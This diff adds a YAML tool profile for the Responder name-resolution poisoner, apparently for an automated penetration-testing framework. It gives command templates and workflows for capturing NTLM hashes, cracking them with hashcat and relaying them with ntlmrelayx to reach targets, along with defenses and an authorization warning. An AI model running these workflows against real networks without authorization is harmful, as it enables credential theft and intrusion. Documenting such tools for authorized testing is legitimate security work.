@@ -1,0 +1,140 @@
+name: responder
+version: 3.1.3.0
+category: windows_exploitation
+description: "LLMNR, NBT-NS and MDNS poisoner for credential harvesting on Windows networks"
+
+capabilities:
+  - llmnr_poisoning
+  - nbt_ns_poisoning
+  - mdns_poisoning
+  - credential_capture
+  - ntlm_hash_capture
+  - smb_relay
+
+target_compatibility:
+  os: [windows]
+  protocols: [llmnr, nbt_ns, mdns, smb, http, https, ftp, ldap, mssql]
+
+commands:
+  basic_poisoning:
+    template: "responder -I {interface}"
+    description: "Basic poisoning on interface"
+    output_format: text
+    estimated_time: null
+  
+  analyze_mode:
+    template: "responder -I {interface} -A"
+    description: "Analyze mode (no poisoning, just observe)"
+    output_format: text
+    estimated_time: null
+  
+  verbose:
+    template: "responder -I {interface} -v"
+    description: "Verbose output"
+    output_format: text
+    estimated_time: null
+  
+  wpad_attack:
+    template: "responder -I {interface} -w -F"
+    description: "Force WPAD auth and fingerprint"
+    output_format: text
+    estimated_time: null
+  
+  smb_relay:
+    template: "responder -I {interface} -r"
+    description: "Enable SMB relay (use with ntlmrelayx)"
+    output_format: text
+    estimated_time: null
+
+output_format: text
+requires_auth: false
+requires_root: true  # Requires raw socket access
+
+attack_vectors:
+  llmnr: "Link-Local Multicast Name Resolution poisoning"
+  nbt_ns: "NetBIOS Name Service poisoning"
+  mdns: "Multicast DNS poisoning"
+  wpad: "Web Proxy Auto-Discovery poisoning"
+
+captured_credentials:
+  - ntlmv1_hashes
+  - ntlmv2_hashes
+  - http_basic_auth
+  - ftp_credentials
+  - ldap_credentials
+  - mssql_credentials
+  - smb_credentials
+
+complementary_tools:
+  - impacket-ntlmrelayx  # Relay captured hashes
+  - hashcat              # Crack captured hashes
+  - john                 # Alternative hash cracker
+  - crackmapexec         # Use captured creds
+
+known_issues:
+  - "Requires root/admin privileges"
+  - "Easily detected by EDR/IDS"
+  - "May disrupt network services"
+  - "Generates significant traffic"
+  - "Modern Windows has defenses"
+
+success_indicators:
+  - "NTLMv2-SSP"
+  - "NTLMv1-SSP"
+  - "Basic Auth"
+  - "Captured"
+
+failure_indicators:
+  - "Error"
+  - "Permission denied"
+  - "Interface not found"
+
+installation:
+  apt: "apt-get install responder"
+  github: "git clone https://github.com/lgandx/Responder"
+  included_with: "Kali Linux"
+
+effectiveness_baseline:
+  unpatched_networks: 0.90
+  modern_networks: 0.40
+  with_llmnr_disabled: 0.10
+
+important_flags:
+  -I: "Network interface"
+  -A: "Analyze mode (passive)"
+  -w: "WPAD rogue proxy"
+  -r: "Enable answers for netbios wredir"
+  -d: "Enable answers for netbios domain"
+  -F: "Force NTLM/Basic authentication"
+  -v: "Verbose mode"
+
+captured_hash_format:
+  ntlmv2: "username::domain:challenge:response:response"
+  ntlmv1: "username::domain:hash:hash:hash"
+
+usage_workflow:
+  step1: "responder -I eth0 -A (analyze network)"
+  step2: "responder -I eth0 (start poisoning)"
+  step3: "Wait for authentication attempts"
+  step4: "Save captured hashes"
+  step5: "hashcat -m 5600 hashes.txt wordlist.txt (crack NTLMv2)"
+
+relay_workflow:
+  step1: "responder -I eth0 (capture hashes)"
+  step2: "impacket-ntlmrelayx -t target_smb (relay to target)"
+  step3: "Wait for authentication"
+  step4: "Gain access to target"
+
+defense_mechanisms:
+  - "Disable LLMNR via GPO"
+  - "Disable NBT-NS"
+  - "Enable SMB signing"
+  - "Network segmentation"
+  - "Monitor for poisoning attempts"
+
+ethical_warning: "LLMNR/NBT-NS poisoning is a man-in-the-middle attack - only use on authorized networks"
+
+output_location:
+  logs: "./logs/"
+  hashes: "./Responder.db" 
+  analyze: "./Responder-Session.log"
